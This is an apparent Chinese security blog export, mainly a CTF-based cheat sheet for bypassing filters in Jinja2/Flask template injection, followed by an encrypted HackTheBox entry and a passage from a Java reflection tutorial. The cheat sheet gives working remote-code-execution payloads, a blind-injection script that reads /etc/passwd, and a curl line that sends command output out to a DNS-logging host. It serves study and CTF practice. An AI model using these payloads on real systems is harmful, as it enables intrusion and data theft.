<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string1=<span class="string">&quot;__class__&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tohex</span>(<span class="params">string</span>):</span></span><br><span class="line">  result = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">      result=result+<span class="string">&quot;\\x&quot;</span>+hex(ord(string[i]))[<span class="number">2</span>:]</span><br><span class="line">  print(result)</span><br><span class="line">  </span><br><span class="line">tohex(string1)</span><br></pre></td></tr></table></figure>
<p>比如说NCTF2020 你是我的master吗 这道题：</p>
<p>waf：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;global&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;req&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;get&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&quot;&quot;[&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;][&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;]()[64][&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;][&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&quot;](&quot;\x6f\x73&quot;)[&quot;\x70\x6f\x70\x65\x6e&quot;](&quot;ls&quot;)[&quot;\x72\x65\x61\x64&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>全16进制，只能在SSTI的时候用。</p>
<h4 id="request绕过">request绕过</h4>
<p>同上</p>
<h3 id="过滤关键字">过滤关键字</h3>
<h4 id="双写、大小写">双写、大小写</h4>
<h4 id="拼接字符">拼接字符</h4>
<p>+拼接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>join拼接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;cla&quot;</span>,<span class="string">&quot;ss&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>格式化+管道符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</span><br></pre></td></tr></table></figure>
<h4 id="替代方法">替代方法</h4>
<p>过滤init，可以用<code>__enter__</code>或<code>__exit__</code>替代</p>
<p>过滤config</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="过滤-v3">过滤<code>[]</code></h3>
<h4 id="索引中的">索引中的<code>[]</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>][<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>].pop(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>].__getitem__(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="魔术方法中的">魔术方法中的<code>[]</code></h4>
<p>魔术方法中本来是没有中括号的，但是如果需要使用<code>[]</code>绕过关键字的话，可以用<code>__getattribute__</code>绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>也可以配合<code>requests</code>绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1&#x3D;__class__</span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</span><br></pre></td></tr></table></figure>
<h3 id="过滤-v4">过滤<code>&#123;&#125;</code></h3>
<h4 id="DNSLOG外带数据">DNSLOG外带数据</h4>
<p>用<code>&#123;%%&#125;</code>替代，使用判断语句进行dns外带数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">433</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;curl `whoami`.k1o75b.ceye.io&quot;</span>).read()==<span class="string">&#x27;ssti&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<h4 id="盲注">盲注</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ip:5000/?name=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.get(url+payload).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;kawhi&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read()[&#x27;</span>+str(i)+<span class="string">&#x27;:&#x27;</span>+str(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> password</span><br></pre></td></tr></table></figure>
<h4 id="print标记">print标记</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Bypass-Plus">Bypass Plus</h2>
<p>介绍一些常见过滤组合和最近的赛题。</p>
<h3 id="过滤-，-和">过滤<code>_</code>，<code>.</code>和<code>'</code></h3>
<p>python3下可以使用<code>_frozen_importlib_external.FileLoader</code>的<code>get_data()</code>方法，第一个是参数0，第二个为要读取的文件名：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">222</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>下划线可以用编码绕过和<code>requests</code>绕过：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">222</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="过滤args，-和">过滤<code>args</code>，<code>.</code>和<code>_</code></h3>
<p>参考y1ng师傅的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x1&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x2&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x3&#x27;</span>])()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(<span class="number">40</span>)|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x5&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x6&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x7&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x8&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x9&#x27;</span>])&#125;&#125;</span><br><span class="line"></span><br><span class="line">post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h2 id="Update">Update</h2>
<h3 id="Unicode绕过">Unicode绕过</h3>
<p>安洵杯2020 EasyFlask：<a href="https://github.com/D0g3-Lab/i-SOON_CTF_2020">https://github.com/D0g3-Lab/i-SOON_CTF_2020</a></p>
<p>GitHub上的题目环境有点问题，文件给的好像不全。</p>
<p>可以看一下过滤：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211009.png" alt=""></p>
<p>直接来看payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(%<span class="number">22</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%<span class="number">22</span>))|attr(%<span class="number">22</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%<span class="number">22</span>)(%<span class="number">22</span>os%<span class="number">22</span>)|attr(%<span class="number">22</span>popen%<span class="number">22</span>)(%<span class="number">22</span>whoami%<span class="number">22</span>)|attr(%<span class="number">22</span>read%<span class="number">22</span>)()%&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>print</code>用来绕过<code>&#123;&#123;&#125;&#125;`，`attr`绕过`.`。

然后这里的`lipsum`是一个方法，可以直接调用os方法，也可以使用`__buildins__`：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

再使用Unicode编码绕过

![](https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211449.png)

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

所以官方给的payload就是：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(<span class="string">&quot;__globals__&quot;</span>))|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;whoami&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()%&#125;</span><br></pre></td></tr></table></figure>

在线网址转换：https://www.branah.com/unicode-converter

PHP脚本转换：

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//字符串转Unicode编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_encode</span>(<span class="params">$strLong</span>) </span>&#123;</span><br><span class="line">  $strArr = preg_split(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, $strLong);<span class="comment">//拆分字符串为数组(含中文字符)</span></span><br><span class="line">  $resUnicode = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">foreach</span> ($strArr <span class="keyword">as</span> $str)</span><br><span class="line">  &#123;</span><br><span class="line">      $bin_str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      $arr = is_array($str) ? $str : str_split($str);<span class="comment">//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)</span></span><br><span class="line">      <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value)</span><br><span class="line">      &#123;</span><br><span class="line">          $bin_str .= decbin(ord($value));<span class="comment">//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      $bin_str = preg_replace(<span class="string">&#x27;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#x27;</span>, <span class="string">&#x27;$1$2$3&#x27;</span>, $bin_str);<span class="comment">//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      $unicode = dechex(bindec($bin_str));<span class="comment">//返回unicode十六进制</span></span><br><span class="line">      $_sup = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">4</span> - strlen($unicode); $i++)</span><br><span class="line">      &#123;</span><br><span class="line">          $_sup .= <span class="string">&#x27;0&#x27;</span>;<span class="comment">//补位高字节 0</span></span><br><span class="line">      &#125;</span><br><span class="line">      $str =  <span class="string">&#x27;\\u&#x27;</span> . $_sup . $unicode; <span class="comment">//加上 \u  返回</span></span><br><span class="line">      $resUnicode .= $str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $resUnicode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串方法1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 转换编码，将Unicode编码转换成可以浏览的utf-8编码</span></span><br><span class="line">  $pattern = <span class="string">&#x27;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#x27;</span>;</span><br><span class="line">  preg_match_all($pattern, $name, $matches);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>($matches))</span><br><span class="line">  &#123;</span><br><span class="line">    $name = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; count($matches[<span class="number">0</span>]); $j++)</span><br><span class="line">    &#123;</span><br><span class="line">      $str = $matches[<span class="number">0</span>][$j];</span><br><span class="line">      <span class="keyword">if</span> (strpos($str, <span class="string">&#x27;\\u&#x27;</span>) === <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        $code = base_convert(substr($str, <span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $code2 = base_convert(substr($str, <span class="number">4</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $c = chr($code).chr($code2);</span><br><span class="line">        $c = iconv(<span class="string">&#x27;UCS-2&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>, $c);</span><br><span class="line">        $name .= $c;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        $name .= $str;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode2</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  $json = <span class="string">&#x27;&#123;&quot;str&quot;:&quot;&#x27;</span> . $str . <span class="string">&#x27;&quot;&#125;&#x27;</span>;</span><br><span class="line">  $arr = json_decode($json, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($arr)) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> $arr[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> unicode_encode(<span class="string">&#x27;__class__&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unicode_decode(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>);</span><br><span class="line"><span class="comment">//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</span></span><br></pre></td></tr></table></figure>

### 魔改字符

太湖杯easy_web，上面所说的过滤双大括号，在一些特定的题目可以魔改`&#123;&#123;&#125;&#125;</code>，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法。</p>
<p>可以在Unicode字符网站寻找绕过的字符，直接在网址搜索<code>&#123;</code>，就会出现类似的字符，就可以找到<code>︷</code>和<code>︸</code>了，网址：<a href="https://www.compart.com/en/unicode/U+FE38">https://www.compart.com/en/unicode/U+FE38</a></p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">︷︷config︸︸</span><br><span class="line">%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B</span><br></pre></td></tr></table></figure>
<h2 id="Reference">Reference</h2>
<p><a href="http://www.cl4y.top/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">http://www.cl4y.top/ssti模板注入学习/</a></p>
<p><a href="https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://xi4or0uji.github.io/2019/01/15/flask之ssti模板注入/</a></p>
<p><a href="https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.m00nback.xyz/2020/02/16/Python沙箱逃逸/</a></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html#mr4YxS2y">https://www.cnblogs.com/bmjoker/p/13508538.html#mr4YxS2y</a></p>
<p><a href="https://blog.szfszf.top/article/15/">https://blog.szfszf.top/article/15/</a></p>
<p><a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>
<p><a href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p>
<p><a href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a></p>
<p><a href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ">https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ</a></p>
]]></content>
      <categories>
        <category>Web安全基础学习</category>
      </categories>
      <tags>
        <tag>Web安全学习</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Doctor-Walkthrough</title>
    <url>/Target_drone/HackTheBox/21.HackTheBox-Doctor-Walkthrough/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fb043ad81f0c53c870662d070af0314825921d4b2bdae224f6304c2bb5f15d29"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础学习之反射和注解</title>
    <url>/Java/code/5.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%92%8C%E6%B3%A8%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="Java基础学习之反射和注解">Java基础学习之反射和注解</h1>
<p>Reference:</p>
<p><a href="https://liaoxuefeng.com">https://liaoxuefeng.com</a></p>
<p><a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p>
<h2 id="0x01-反射">0x01 反射</h2>
<h3 id="反射概念">反射概念</h3>
<p>反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法/访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p>
<h3 id="java反射机制流程图">java反射机制流程图</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210309150130.png" alt=""></p>
<p>比如我们创建了一个类文件，经过javac编译之后，就会形成class文件，同时jvm内存会查找生成的class文件读入内存和经过ClassLoader加载，同时会自动创建生成一个Class对象，里面拥有其获取成员变量Field，成员方法Method和构造方法Constructor等方法。最后就是我们平时new创建对象。</p>
<p>这里其实跟我们了解到java运行体系没有很大区别，只是我们生成class文件的时候，也创建了Class对象。而Class是java.lang.Class类中，是所有类的的类。而类是java.lang.Class类的实例对象，所以我们的反射机制本身不复杂，就是获取一个类的Class对象，然后在用Class对象中的获取成员变量Field，成员方法Method和构造方法Constructor等方法，再去动态获取一个类或者调用一个类的属性，变量，构造方法等方式。</p>
<h3 id="Class类">Class类</h3>
<p>JVM每加载一种<code>class</code>，就为其创建一个<code>Class</code>实例，并关联起来。注意：这里的<code>Class</code>类型是一个名叫<code>Class</code>的<code>class</code>，形如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Class</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以String类为例，当JVM加载String类的时候，首先会读取<code>String.class</code>到内存，然后，为<code>String</code>类创建一个<code>Class</code>实例并关联起来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cls = <span class="keyword">new</span> Class(String);</span><br></pre></td></tr></table></figure>
<p>JVM持有的每个<code>Class</code>实例都指向一个数据类型（<code>class</code>或<code>interface</code>）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; String</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.String&quot;  │</span><br><span class="line">└───────────────────────────┘</span><br><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; Random</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.util.Random&quot;  │</span><br><span class="line">└───────────────────────────┘</span><br><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; Runnable</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.Runnable&quot;│</span><br><span class="line">└───────────────────────────┘</span><br></pre></td></tr></table></figure>
<p>一个<code>Class</code>实例包含了该<code>class</code>的所有完整信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; String</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.String&quot;  │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│package &#x3D; &quot;java.lang&quot;      │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│super &#x3D; &quot;java.lang.Object&quot; │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│interface &#x3D; CharSequence...│</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│field &#x3D; value[],hash,...   │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│method &#x3D; indexOf()...      │</span><br><span class="line">└───────────────────────────┘</span><br></pre></td></tr></table></figure>
<p>由于JVM为每个加载的<code>class</code>创建了对应的<code>Class</code>实例，并在实例中保存了该<code>class</code>的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息。</p>
<p>这种通过<code>Class</code>实例获取<code>class</code>信息的方法称为反射（Reflection）。</p>
<p>获取一个<code>class</code>的<code>Class</code>实例有三种方法：</p>
<p>方法一：直接通过一个<code>class</code>的静态变量<code>class</code>获取：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class cls &#x3D; String.class;</span><br></pre></td></tr></table></figure>
<p>方法二：如果我们有一个实例变量，可以通过该实例变量提供的<code>getClass()</code>方法获取：</p>
